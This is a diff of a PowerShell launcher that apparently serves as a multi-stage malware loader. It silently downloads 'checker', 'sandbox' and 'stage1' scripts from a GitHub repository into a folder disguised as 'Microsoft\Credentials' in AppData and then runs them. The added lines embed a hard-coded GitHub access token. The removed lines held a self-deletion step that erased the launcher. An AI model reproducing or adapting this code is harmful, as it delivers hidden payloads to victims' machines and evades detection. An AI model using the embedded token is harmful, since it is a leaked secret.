@@ -1,29 +1,32 @@
-# launcher.ps1 - Chains checker → sandbox → stage1
+# launcher.ps1 - Chains checker â†’ sandbox â†’ stage1
 
 $ErrorActionPreference = 'SilentlyContinue'
 $appData = [System.IO.Path]::GetFolderPath('ApplicationData')
-$desktop = [System.Environment]::GetFolderPath('Desktop')
 $basePath = "$appData\Microsoft\Credentials"
+$githubToken = "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"
 
-# === Fetch scripts from GitHub ===
-$repo = "https://raw.githubusercontent.com/slynet999-coder/Yambo/main"
+# === Fetch scripts from GitHub via API ===
 $scripts = @("checker.ps1", "sandbox.ps1", "stage1.ps1")
 
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+    $headers = @{
+        "Authorization" = "token $githubToken"
+        "Accept" = "application/vnd.github.v3+json"
+    }
 
     foreach ($script in $scripts) {
-        $url = "$repo/$script"
         $path = "$basePath\$script"
         
         try {
-            $wc.DownloadFile($url, $path)
+            $fileInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/slynet999-coder/Yambo/contents/$script" -Headers $headers
+            $content = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($fileInfo.content))
+            [System.IO.File]::WriteAllText($path, $content, [System.Text.Encoding]::UTF8)
         } catch {
-            # Fallback to temp
             $path = "$env:TEMP\$script"
-            $wc.DownloadFile($url, $path)
+            $fileInfo = Invoke-RestMethod -Uri "https://api.github.com/repos/slynet999-coder/Yambo/contents/$script" -Headers $headers
+            $content = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($fileInfo.content))
+            [System.IO.File]::WriteAllText($path, $content, [System.Text.Encoding]::UTF8)
         }
     }
 } catch {}
@@ -40,6 +43,3 @@ foreach ($script in $scripts) {
         } catch {}
     }
 }
-
-# === Cleanup launcher ===
-try { Remove-Item $MyInvocation.ScriptName -Force -ErrorAction SilentlyContinue } catch {}
